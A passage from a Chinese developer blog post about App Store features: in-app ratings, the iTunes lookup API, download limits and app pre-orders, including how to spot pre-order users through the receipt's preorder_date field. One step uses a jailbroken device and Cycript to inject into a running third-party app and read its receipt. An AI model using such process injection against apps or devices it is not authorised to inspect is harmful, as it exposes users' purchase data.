环境不会显示评分界面</li><li>生产环境一个用户账号最多显示3次/365天</li><li>生产环境如果已经评论成功，再调用不会再弹</li></ul><p>很多开发者如果不太留意，看到上面的弹窗，会以为只能在 App Store 才能文字评论。其实，在 app 内也可以写评论，在星级评论提交后，会显示下面的界面：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/70534adff730489f880561887e107fc7~tplv-k3u1fbpfcp-watermark.image" alt="16279103951283.jpg"></p><p>用户还可以选择，要不要撰写评论。当然点击”<strong>好</strong>“表示不写文字评论了。</p><p>app 评分数量太少，可能会降低用户下载 app 的意愿，所以，苹果提高了这样的接口给开发者来选择。那么对于开发者来说，可以得到更多用户评论的机会，但如果不转移到 App Store 评论，就减少了 app 的曝光量。当然，好的 app 会消除了用户的顾虑，<strong>但酒香也怕巷子深，需要开发者多维度思考。</strong></p><p>最后，从用户角度来看，如果你觉得 app 内评论影响到你的使用体验，其实你是可以在设置里关闭的：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/95717a9e31ce44e4b611030a40b74cf3~tplv-k3u1fbpfcp-watermark.image" alt="16279110089060.jpg"></p><p>在设置的 App Store 子页面中，可以选择关闭。所以，苹果的产品，确实会更多的站在用户体验来思考，不仅仅是(不)满足开发者。</p><h4 id="2-5-iTunes-Store-API"><a href="#2-5-iTunes-Store-API" class="headerlink" title="2.5 iTunes Store API"></a>2.5 iTunes Store API</h4><p>苹果提供了一套 API 给开发者用来获取 iTunes Store、App Store、iBooks Store 和Mac App Store 的内容信息，包括 App、iBooks、电影、播客、音乐、音乐视频、有声读物和电视节目等。</p><p>比如获取 app 的最新信息，请求 <code>https://itunes.apple.com/cn/lookup?id=1558453472</code> 可以获取到：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;resultCount&quot;</span>: <span class="number">1</span>,</span><br><span class="line"><span class="attr">&quot;results&quot;</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;advisories&quot;</span>: [</span><br><span class="line"><span class="string">&quot;偶尔/轻微的卡通或幻想暴力&quot;</span>, <span class="string">&quot;偶尔/轻微的现实暴力&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;appletvScreenshotUrls&quot;</span>: [</span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;artistId&quot;</span>: <span class="number">1540746184</span>,</span><br><span class="line"><span class="attr">&quot;artistName&quot;</span>: <span class="string">&quot;Khorgas Zhifan Network Technology Co., Ltd.&quot;</span>,</span><br><span class="line"><span class="attr">&quot;artistViewUrl&quot;</span>: <span class="string">&quot;https://apps.apple.com/cn/developer/khorgas-zhifan-network-technology-co-ltd/id1540746184?uo=4&quot;</span>,</span><br><span class="line"><span class="attr">&quot;artworkUrl100&quot;</span>: <span class="string">&quot;.../100x100bb.jpg&quot;</span>,</span><br><span class="line"><span class="attr">&quot;artworkUrl512&quot;</span>: <span class="string">&quot;https://is2-ssl.mzstatic.com/image/thumb/Purple115/v4/67/ac/7e/67ac7e2b-765c-ac94-9a60-215e975312e4/source/512x512bb.jpg&quot;</span>,</span><br><span class="line"><span class="attr">&quot;artworkUrl60&quot;</span>: <span class="string">&quot;.../60x60bb.jpg&quot;</span>,</span><br><span class="line"><span class="attr">&quot;averageUserRating&quot;</span>: <span class="number">4.5312200000000002475530891388189047574</span>,</span><br><span class="line"><span class="attr">&quot;averageUserRatingForCurrentVersion&quot;</span>: <span class="number">4.5312200000000002475530891388189047574</span>,</span><br><span class="line"><span class="attr">&quot;bundleId&quot;</span>: <span class="string">&quot;com.khorgas.hsdj&quot;</span>,</span><br><span class="line"><span class="attr">&quot;contentAdvisoryRating&quot;</span>: <span class="string">&quot;12+&quot;</span>,</span><br><span class="line"><span class="attr">&quot;currency&quot;</span>: <span class="string">&quot;CNY&quot;</span>,</span><br><span class="line"><span class="attr">&quot;currentVersionReleaseDate&quot;</span>: <span class="string">&quot;2021-07-20T15:01:04Z&quot;</span>,</span><br><span class="line"><span class="attr">&quot;description&quot;</span>: <span class="string">&quot;———2亿魂师推荐，真3D战斗手游———</span></span><br><span class="line"><span class="string">21年度国民级IP战斗手游巨作，由阅文集团和腾讯动画正版授权，2亿用户推荐，和动画一模一样的《斗罗大陆：魂师对决》7月22日正式公测！下载与万千魂师即刻对决！</span></span><br><span class="line"><span class="string">        ...</span></span><br><span class="line"><span class="string">        ...</span></span><br><span class="line"><span class="string">        &quot;</span>,</span><br><span class="line"><span class="attr">&quot;features&quot;</span>: [</span><br><span class="line"><span class="string">&quot;iosUniversal&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;fileSizeBytes&quot;</span>: <span class="string">&quot;1441496064&quot;</span>,</span><br><span class="line"><span class="attr">&quot;formattedPrice&quot;</span>: <span class="string">&quot;免费&quot;</span>,</span><br><span class="line"><span class="attr">&quot;genreIds&quot;</span>: [</span><br><span class="line"><span class="string">&quot;6014&quot;</span>, <span class="string">&quot;7014&quot;</span>, <span class="string">&quot;7017&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;genres&quot;</span>: [</span><br><span class="line"><span class="string">&quot;游戏&quot;</span>,</span><br><span class="line"><span class="string">&quot;角色扮演&quot;</span>,</span><br><span class="line"><span class="string">&quot;策略&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;ipadScreenshotUrls&quot;</span>: [</span><br><span class="line"><span class="string">&quot;https://is4-ssl.mzstatic.com/image/thumb/PurpleSource125/v4/33/6f/ee/336fee4b-ced2-a41c-7e53-45ab6ad8e446/86ac5fcd-ba9d-41ee-8a20-63899b6b7697_2732x2048-1.jpg/552x414bb.jpg&quot;</span>,</span><br><span class="line">...</span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;isGameCenterEnabled&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">&quot;isVppDeviceBasedLicensingEnabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">&quot;kind&quot;</span>: <span class="string">&quot;software&quot;</span>,</span><br><span class="line"><span class="attr">&quot;languageCodesISO2A&quot;</span>: [</span><br><span class="line"><span class="string">&quot;ZH&quot;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;minimumOsVersion&quot;</span>: <span class="string">&quot;10.0&quot;</span>,</span><br><span class="line"><span class="attr">&quot;price&quot;</span>: <span class="number">0.0</span>,</span><br><span class="line"><span class="attr">&quot;primaryGenreId&quot;</span>: <span class="number">6014</span>,</span><br><span class="line"><span class="attr">&quot;primaryGenreName&quot;</span>: <span class="string">&quot;Games&quot;</span>,</span><br><span class="line"><span class="attr">&quot;releaseDate&quot;</span>: <span class="string">&quot;2021-07-20T07:00:00Z&quot;</span>,</span><br><span class="line"><span class="attr">&quot;releaseNotes&quot;</span>: <span class="string">&quot;1.斗罗大世界全新打造，真实天气交互，沉浸式的斗罗大陆，还每个斗罗迷一个真斗罗！</span></span><br><span class="line"><span class="string">2.随机融合技玩法，觉醒你的专属武魂，深度培养，自由成长变异，挑战斗罗大陆最强的魂技策略组合！</span></span><br><span class="line"><span class="string">3.其他优化：引擎、兼容性、画面等全面优化，提升游戏最佳体验！&quot;</span>,</span><br><span class="line"><span class="attr">&quot;screenshotUrls&quot;</span>: [</span><br><span class="line"><span class="string">&quot;https://is3-ssl.mzstatic.com/image/thumb/PurpleSource125/v4/65/7c/25/657c25a0-3fc7-cab5-b3f3-e46f8ece74d4/440d205f-827a-4446-9b28-2dcce8bef01e_2208x1242-1.jpg/406x228bb.jpg&quot;</span>,</span><br><span class="line">...</span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;sellerName&quot;</span>: <span class="string">&quot;Khorgas Zhifan Network Technology Co., Ltd.&quot;</span>,</span><br><span class="line"><span class="attr">&quot;supportedDevices&quot;</span>: [</span><br><span class="line"> ...</span><br><span class="line">],</span><br><span class="line"><span class="attr">&quot;trackCensoredName&quot;</span>: <span class="string">&quot;斗罗大陆：魂师对决-腾讯动画正版授权&quot;</span>,</span><br><span class="line"><span class="attr">&quot;trackContentRating&quot;</span>: <span class="string">&quot;12+&quot;</span>,</span><br><span class="line"><span class="attr">&quot;trackId&quot;</span>: <span class="number">1558453472</span>,</span><br><span class="line"><span class="attr">&quot;trackName&quot;</span>: <span class="string">&quot;斗罗大陆：魂师对决-腾讯动画正版授权&quot;</span>,</span><br><span class="line"><span class="attr">&quot;trackViewUrl&quot;</span>: <span class="string">&quot;https://apps.apple.com/cn/app/%E6%96%97%E7%BD%97%E5%A4%A7%E9%99%86-%E9%AD%82%E5%B8%88%E5%AF%B9%E5%86%B3-%E8%85%BE%E8%AE%AF%E5%8A%A8%E7%94%BB%E6%AD%A3%E7%89%88%E6%8E%88%E6%9D%83/id1558453472?uo=4&quot;</span>,</span><br><span class="line"><span class="attr">&quot;userRatingCount&quot;</span>: <span class="number">44061</span>,</span><br><span class="line"><span class="attr">&quot;userRatingCountForCurrentVersion&quot;</span>: <span class="number">44061</span>,</span><br><span class="line"><span class="attr">&quot;version&quot;</span>: <span class="string">&quot;2.0.2&quot;</span>,</span><br><span class="line"><span class="attr">&quot;wrapperType&quot;</span>: <span class="string">&quot;software&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细的内容字段，这里就不解析了，看就明白了。对于开发者来说，很方便通过苹果这个链接的数据获取一些信息，比如 app 的图标 <code>artworkUrl512</code> 字段获取，或者是 app 的版本号，可以通过这个信息来判断是否有新版本等。</p><p>根据小编经验，一般发布一个新版本后，大概 15 分钟这样，这个链接的数据才会更新，并且这个链接的数据更新后，App Store 才会显示可更新的版本。所以，对于发布新版本对外后，app 何时生效，通过监听这个链接的变动，目前是一个高效的方式，毕竟 app 发布后苹果只保证 24 小时内生效。</p><p>因为我们国内用苹果音乐、视频 TV 等比较少，所以这里就不介绍了，详细可以参考：<a href="https://developer.apple.com/library/archive/documentation/AudioVideo/Conceptual/iTuneSearchAPI/index.html">iTunes Search API</a> 和 <a href="http://resources.organicfruitapps.com/documentation/itunes-store-web-service-search-api/">iTunes Store API</a> 文档。</p><h4 id="2-6-App-下载"><a href="#2-6-App-下载" class="headerlink" title="2.6  App 下载"></a>2.6  App 下载</h4><p>对于游戏来说，包体一般都是在 1 GB 以上，AppStore 使用蜂窝移动下载的应用包最大多少MB呢？</p><ul><li>2017年9月，蜂窝流量下载限制从 <code>100M</code> 扩大到 <code>150M</code></li><li>2019年5月下旬, 蜂窝流量下载限制从 <code>150M</code> 扩大到 <code>200M</code></li><li>2019年9月，iOS 13 正式版发布，可以选择使用蜂窝网络下载（不限制大小）。</li></ul><p>所以，低于 iOS 13 的设备，可以使用蜂窝网络下载大小<code>不超过 200 MB</code> 的 App，否则，只能通过 WiFi（手机开热点也可以。）。</p><p>对于 iOS 13 以上，如果下载超过 200MB 的应用时，会提示链接 WiFi 时再下载 或 直接使用蜂窝网络下载：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2e77f49a26eb4f53888132897499eef2~tplv-k3u1fbpfcp-watermark.image" alt="16279156714109.jpg"></p><p>选项可以在设置中更改，请前往“设置” -&gt; “App Store”  -&gt;  “App下载”：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/61b6d7c2fa304a999a525a18093ecfb8~tplv-k3u1fbpfcp-watermark.image" alt="16279157529555.jpg"></p><p>如上图，在 iOS 13+ 有三个可选项：</p><ol><li>始终允许</li><li>超过 200 MB 时请求许可</li><li>始终询问</li></ol><p>所以，2019年9月后，蜂窝流量下载的限制应该是算没有了，苹果不在通过 AppStore 强制来控制，而是把选择权交回给用户。对于开发者来说，这也是一个好消息。</p><h4 id="2-7-App-预订"><a href="#2-7-App-预订" class="headerlink" title="2.7 App 预订"></a>2.7 App 预订</h4><p>App 预订功能大家应该都有了解过，那么你知道以下几个问题的答案吗？</p><ul><li>预订后的发布时间对应北京时间是几点？</li><li>用户预订 app 后能取消预订吗？</li><li>app 上线后怎么区分那些用户是预订过的？</li><li>app 能像谷歌一样给预订的用户发奖励吗？</li></ul><p>App 预订功能为什么这么多问题，原因有几个方面，一是开启 App 预订的前提条件有 2 个：</p><ol><li>app 未曾上架商店</li><li>app 过审已经通过，等待开发者发布</li></ol><p>这 2 个条件已经难道一批开发者，最重要的是测试环境！苹果没有提供 App 预订的测试环境！或者测试的方案！完成让你在生产环境上搞，所以，第一次吃螃蟹的人都是勇(辣)敢(鸡)的战(苹)士(果)！</p><p><strong>预订后的发布时间对应北京时间是几点？</strong><br>这个问题，所有有预订 app 的开发者可能会有这样的疑问。从苹果官方文档中，目前获取不到答案。从经验来说，一般是北京时间 23 点时默认预定发布；当然，开发者可以在苹果后台手动选择马上发布，而跳过系统自动定时发布。那么这个预订发布时间到底是什么时间呢？</p><p>假设预订时间是： <code>2020-10-16</code><br>那么真实预订生效时间：2020-10-15 北京时间 22:00 生效(或 23:00 生效)</p><p>首先，我们想到的是从苹果后台网页的源码查找：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/818171fb7609495a997c341b827ed0f6~tplv-k3u1fbpfcp-watermark.image" alt="16278752890505.jpg"></p><p>上图的时间戳 1551168000000（毫秒） 转成北京时间为 2019-02-26 16:00:00 。显然不符合预期时间，所以，到底是什么时间？</p><p>最后在从苹果的 <code>iTunes Search API</code> 接口获取到 app 的信息（小编注：此接口下文会详细讲解，此处先略过。），接口返回的 Json 数据里有一个字段 <code>releaseDate</code>，大概的内容是这样 <code>&quot;releaseDate&quot;: &quot;2021-09-23T07:00:00Z&quot;</code>（预订发布时间是2021年9月23日推出。）。刚开始小编也认为这个时间是 UTC/GMT 时间，最近根据北京时间 22:00 生效(或 23:00 生效)节点，推测苹果的 <strong>releaseDate</strong> 字段的时间是太平洋时间。那么太平洋时间是什么呢？</p><p>从维基百科 <a href="https://zh.wikipedia.org/wiki/%E5%A4%AA%E5%B9%B3%E6%B4%8B%E6%97%B6%E5%8C%BA">太平洋时区</a> 查看：</p><blockquote><p>太平洋时区（Pacific Time Zone）是在美国、加拿大及墨西哥西海岸靠近太平洋地区使用的时区。</p></blockquote><ul><li>太平洋时区：也被称为太平洋时间（Pacific Time，<code>PT</code>）。</li><li>其标准时间（冬季）称为太平洋标准时间（Pacific Standard Time，<code>PST</code>），UTC-8；</li><li>夏令时间（夏季）称为太平洋夏令时间（Pacific Daylight Time，<code>PDT</code>），UTC-7。</li></ul><p>这里可以直接看截图：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/384a2351f2c54f25918e62a096603d0f~tplv-k3u1fbpfcp-watermark.image" alt="16278762021317.jpg"></p><blockquote><p>这是小编之前在公司内部分享《游戏出海本地化概述》的PPT（预告：下一篇文章会整理分享给大家。）</p></blockquote><p>简单来说，中国标准时间(CST)比世界协调时间(UTC)早 8 小时，而太平洋夏令时间(PDT)比世界协调时间(UTC)晚 7 小时，也就是太平洋夏令时间(PDT)比中国标准时间(CST)晚 15 小时。</p><p>所以，太平洋夏令时间 7:00 (7:00 AM) = 北京时间 22:00 (10:00 PM) 。时间是对上了，但是日期没有对上！<code>&quot;releaseDate&quot;: &quot;2021-09-23T07:00:00Z&quot;</code>，所以这个至今还是一个迷，小编猜想苹果的服务器时间可能历史原因，还是用太平洋时间为基准，比如每年圣诞节暂时审核的时间也是太平洋时间。所以，这个问题有知道的朋友，可以在评论区一起讨论哈~</p><p>最后，关于 GMT/UTC/PST 这些时间，夏令时中国也实行过，本文就暂不深入展开，有时候会在单独梳理一篇关于时间的文章，敬请大家期待哈~</p><blockquote><p>1986年至1991年，中华人民共和国在全国范围实行了六年夏令时，每年从4月中旬的第一个星期日2时整(北京时间)到9月中旬第一个星期日的凌晨2时整(北京夏令时)。除1986年因是实行夏令时的第一年，从5月4日开始到9月14日结束外，其它年份均按规定的时段施行。夏令时实施期间，将时间向后调快一小时。1992年4月5日后不再实行。</p></blockquote><p><strong>用户预订 app 后能取消预订吗？</strong></p><p>答案是肯定可以啊。具体可以在 App Store app 的账户设置里进行取消：</p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eb447bfdd47a4bf7a4105e2c2611dea7~tplv-k3u1fbpfcp-watermark.image" alt="16278789480428.jpg"></p><p>其它方式可以参考 <a href="https://support.apple.com/zh-cn/HT202723">官方文档</a>，另外，如果应用是付费下载的方式，那么预订时并不会马上收取费用，在应用发布后，系统会从你的付款方式中收取费用，并且会发一封电子邮件通知你。（注：如果付费应用，在预订期间调整 App 的价格，则会在顾客接受预订的价格和发布当日的价格中，选择较低的价格向顾客收取。）</p><p>而预订的用户，在应用发布后，系统是否会自动下载到用户的设备上？如果该用户 <a href="https://support.apple.com/zh-cn/HT202180">启用自动下载</a>，则该 App 也会下载至该用户的所有其他设备上。启用自动下载的开关如下图：</p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f776ff1ced314c9ea43446a6d8b011b1~tplv-k3u1fbpfcp-watermark.image" alt="16278850982545.jpg"></p><p><strong>app 上线后怎么区分那些用户是预订过的？</strong></p><p>曾经一度认为苹果的没有标识预订用户的接口，然后在苹果 <a href="https://developer.apple.com/cn/app-store/pre-orders/">营销您的 App </a> 页面的最下面看到一段不起眼的话：</p><blockquote><p>您可以通过收据中的 “<a href="https://developer.apple.com/documentation/appstorereceipts/responsebody/receipt">preorder_date (英文)</a>” (预订日期) 字段来识别已预订您 app 的顾客。您可以使用此信息为预订用户解锁奖励 (如额外的游戏币)，或在 app 内显示感谢购买的信息。</p></blockquote><p>根据苹果的文档 <a href="https://developer.apple.com/documentation/appstorereceipts/responsebody/receipt">responseBody.Receipt</a>，苹果提供了三个用户预约 app 时间的字段（三个不同时间格式）：</p><table><thead><tr><th>字段</th><th>作用(英文)</th><th>作用(中文)</th></tr></thead><tbody><tr><td><code>preorder_date</code></td><td>The time the user ordered the app available for pre-order, in a date-time format similar to ISO 8601.</td><td>用户订购可用于预订的 app 的时间，采用类似于 ISO 8601 的日期时间格式。</td></tr><tr><td><code>preorder_date_ms</code></td><td>The time the user ordered the app available for pre-order, in UNIX epoch time format, in milliseconds. This field is only present if the user pre-orders the app. Use this time format for processing dates.</td><td>用户订购可用于预购的 app 的时间，以 UNIX 纪元时间格式，以毫秒为单位。此字段仅在用户预订应用程序时出现。使用此时间格式处理日期。</td></tr><tr><td><code>preorder_date_pst</code></td><td>The time the user ordered the app available for pre-order, in the Pacific Time zone.</td><td>用户在太平洋时区订购可供预订的 app 的时间。</td></tr></tbody></table><p>如果大家熟悉 receipt data，那么肯定会有这样的疑问？通过内购的收据查用户预订状态？？？对的！从目前的苹果 API 来看，还没有一个针对用户 App Store 信息的库或者一套  API，所以可能苹果工程师从简单的角度来看，预订的数据是 App Store 的数据，而 App Store 的内购又是一套通用的 API，所以直接放在 receipt 里面 ？？！！</p><p>一切都是这么的(不)合理！为了拿到用户的预订时间，而这么复杂化的流程，并且 receipt 数据比较大，所以，苹果工程师估计也是知道的，所以在 WWDC21 推出了 StoreKit 2，但苹果并没有针对预订状态查询提供新的接口，具体可以翻看之前的文章 <a href="https://juejin.cn/post/6974733392260644895">苹果内购 - WWDC21</a>。</p><p>说了这么多，那么开始说点技术的内容啊，首先是获取苹果 Receipt 收据的接口：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NSString</span> *receiptString = [[<span class="built_in">NSString</span> alloc] initWithData:[[<span class="built_in">NSData</span> dataWithContentsOfURL:[[<span class="built_in">NSBundle</span> mainBundle] appStoreReceiptURL]] base64EncodedDataWithOptions:<span class="number">0</span>] encoding:<span class="built_in">NSUTF8StringEncoding</span>];</span><br></pre></td></tr></table></figure><p>那么问题来了，这个获取的数据，在沙盒环境下，并没有 <code>preorder_date</code> 字段，因为在测试环境下，app 无法模拟预订的过程，所以辣鸡！这时候就是脑洞大开的时间了，那就下载一些之前预订的 app，获取它的 Receipt 数据，看看 <code>preorder_date</code> 的时间就好啦！（还好 App Store 有很多预订中的 app，所以大家用户自己开发一个新 app 然后送审，在然后预订下载，不然这样一个流程下来，估计已经花一个月以上了！）</p><p>通过越狱设备，下载预订的 app，然后 <code>Cycript</code> 命令工具，执行 <code>cycript -p 进程名</code> 或者 <code>cycript -p 进程ID</code>，然后执行下面的代码，就可以得到 Receipt 数据：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="built_in">NSString</span> alloc] initWithData:[[<span class="built_in">NSData</span> dataWithContentsOfURL:[[<span class="built_in">NSBundle</span> mainBundle] appStoreReceiptURL]] base64EncodedDataWithOptions:<span class="number">0</span>] encoding:<span class="built_in">NSUTF8StringEncoding</span>]</span><br></pre></td></tr></table></figure><blockquote><p>注：Cycript 由 Cydia 创始人 Saurik 推出的一款脚本语言，它混合了 Objective-C 与 JavaScript 语法解释器，能够探测和修改运行中的应用程序。Cycript 主要用于注入目标进程来实现运行时调试，它的优点是重启程序后所有的修改都会失效，对原生程序或代码完全无副作用。关于越狱更多知识，大家自行查阅相关资料啊，这里也不展开了。</p></blockquote><p>最后，把获取到的 Receipt 数据，通过苹果的 <a href="https://developer.apple.com/documentation/appstorereceipts/verifyreceipt">verifyReceipt</a> 接口验证，获取到收据的内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    environment = Production;</span><br><span class="line">    receipt =     &#123;</span><br><span class="line">        <span class="attr">&quot;adam_id&quot;</span> = 1558453472;</span><br><span class="line">        <span class="attr">&quot;app_item_id&quot;</span> = 1558453472;</span><br><span class="line">        <span class="attr">&quot;application_version&quot;</span> = 14;</span><br><span class="line">        <span class="attr">&quot;bundle_id&quot;</span> = <span class="attr">&quot;com.khorgas.hsdj&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;download_id&quot;</span> = 111070588400817;</span><br><span class="line">        <span class="attr">&quot;in_app&quot;</span> =         (</span><br><span class="line">        );</span><br><span class="line">        <span class="attr">&quot;original_application_version&quot;</span> = 14;</span><br><span class="line">        <span class="attr">&quot;original_purchase_date&quot;</span> = <span class="attr">&quot;2021-07-20 15:39:32 Etc/GMT&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;original_purchase_date_ms&quot;</span> = 1626795572000;</span><br><span class="line">        <span class="attr">&quot;original_purchase_date_pst&quot;</span> = <span class="attr">&quot;2021-07-20 08:39:32 America/Los_Angeles&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;preorder_date&quot;</span> = <span class="attr">&quot;2021-05-03 03:34:56 Etc/GMT&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;preorder_date_ms&quot;</span> = 1620012896000;</span><br><span class="line">        <span class="attr">&quot;preorder_date_pst&quot;</span> = <span class="attr">&quot;2021-05-02 20:34:56 America/Los_Angeles&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;receipt_creation_date&quot;</span> = <span class="attr">&quot;2021-08-02 02:32:58 Etc/GMT&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;receipt_creation_date_ms&quot;</span> = 1627871578000;</span><br><span class="line">        <span class="attr">&quot;receipt_creation_date_pst&quot;</span> = <span class="attr">&quot;2021-08-01 19:32:58 America/Los_Angeles&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;receipt_type&quot;</span> = Production;</span><br><span class="line">        <span class="attr">&quot;request_date&quot;</span> = <span class="attr">&quot;2021-08-02 07:18:50 Etc/GMT&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;request_date_ms&quot;</span> = 1627888730021;</span><br><span class="line">        <span class="attr">&quot;request_date_pst&quot;</span> = <span class="attr">&quot;2021-08-02 00:18:50 America/Los_Angeles&quot;</span>;</span><br><span class="line">        <span class="attr">&quot;version_external_identifier&quot;</span> = 843086210;</span><br><span class="line">    &#125;;</span><br><span class="line">    status = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就可以获取到预订的时间：</p><ul><li>“original_purchase_date” = “2021-07-20 15:39:32 Etc/GMT”;</li><li>“original_purchase_date_ms” = 1626795572000;</li><li>“original_purchase_date_pst” = “2021-07-20 08:39:32 America/Los_Angeles”;</li></ul><p>综上，这就是判断一个用户是否为预订用户的方法，是不是感觉绕了一圈子！这也是目前唯一的方法了。另外，如果没有 <code>preorder_date</code> 字段，那么这个用户就是非预订用户，是在预订时间后才下载应用的。</p><p><strong>app 能像谷歌一样给预订的用户发奖励吗？</strong></p><p>像游戏，一般会给预订的用户，在开服当天发送奖励，那么实现这个预订的用户发放奖励，流程是怎么样？</p><p>先说一下 Google Play Store，从 <a href="https://support.google.com/googleplay/android-developer/answer/9859047?hl=zh-Han">为应用开放预注册服务以提升用户认知度</a>  文档可以看到，开发者可选择提供预注册奖励，只需要在 Play 后台设置状态的商品（内购品项）。整个预订的用户判断和发奖流程，都是谷歌统一来处理和管理，不需要开发者操心！正如我们上一篇文章说的 <a href="https://juejin.cn/post/6986478834040209445">解读 AppStore 新功能：自定义产品页面和 A/B Test 工具</a>，Apple &amp; Google、iOS &amp; Android、App Store &amp; Play Store，相互学习相互借鉴，至少目前来说，苹果苹果需要向谷歌学习的地方确实还有很好！加油苹果~</p><p>那么 iOS 怎么给预订的用户发送奖励呢？从上面的流程，大家可能已经感受到了。用户是否为预约用户，要先从用户下载的 app 里调用苹果接口获取 Receipt 收据，发送给服务端向苹果验证这个收据，响应的收据信息里，有 preorder_date 字段，判断用户预约的时间，然后就可以判断用户发放奖励等处理逻辑。</p><p>详细的发奖励流程，这里就不详细展开了，但这里需要注意一点是防止用户恶意刷取，因为刚刚说了，有没有这个字段是跟用户的 apple id 账号关联的，而一个 apple id 账号是可以登陆多个设备的。可以感受到，苹果的这个预订奖励功能有多烂，没有对比就没有伤害。谷歌的预订奖励是谷歌服务来控制，谷歌可以控制一个谷歌Play用户只能领取一次！</p><p><strong>其它的坑点</strong></p><p>苹果新后台刚刚改版时，出现了很多问题，其中一个就是预订时间无法更改的Bug，导致了想延迟预订时间都没有办法。不得不吐槽一下苹果，当出现 bug 时，一般是通过邮件或者电话联系开发者当地的客服，而一般开发者反馈的问题都不会得到重视，导致了一些问题让开发者很煎熬！</p><p>遇到这种问题时，只能默默选择下架应用，那么下架后，担心已经预订的用户是不是收到下载通知？<a href="https://help.apple.com/app-store-connect/?lang=zh-cn#/dev44877b669">苹果的文档</a> 有解析：如果您将 App 预订从 App Store 中移除，除非在发布日期之前您再次使其支持预订，否则已经预订了您 App 的顾客将不会收到该 App，且不会向顾客收取费用。此外，一旦发布日期已过，您便不能再次将 App 以预订形式发布。</p><p>最后一个问题就是，预订状态的生效时间。用户预订应用后，App Store 会显示灰色的 <code>已预订</code> 按钮，无法点击：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/5727378a09804dd3ba63cabc125423ca~tplv-k3u1fbpfcp-watermark.image" alt="16278916831006.jpg"></p><p>然而，有一些用户就是没有开启自动下载功能，这时候，其实用户是不会自动下载的。然后因为苹果服务器应用发布生效时间只保证 24 小时内，所以，导致这部分用户在 App Store 